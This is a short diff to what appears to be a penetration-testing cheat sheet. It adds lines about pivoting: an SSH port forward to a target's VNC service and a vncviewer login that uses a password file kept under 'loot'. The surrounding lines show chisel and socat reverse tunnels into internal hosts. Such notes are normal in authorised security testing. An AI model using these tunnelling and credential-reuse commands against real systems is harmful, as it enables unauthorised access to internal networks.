@@ -142,6 +142,8 @@ ssh -R 8080:localhost:80 user@TARGET
 ./chisel server -p 8000 --reverse
 ./chisel client YOUR_IP:8000 R:8080:INTERNAL:80
 socat TCP-LISTEN:8080,fork TCP:INTERNAL:80
+ssh -N -L 5901:127.0.0.1:5901 user@TARGET -f
+vncviewer -passwd loot/secret 127.0.0.1::5901
 ```
 ## ACTIVE DIRECTORY
 ```
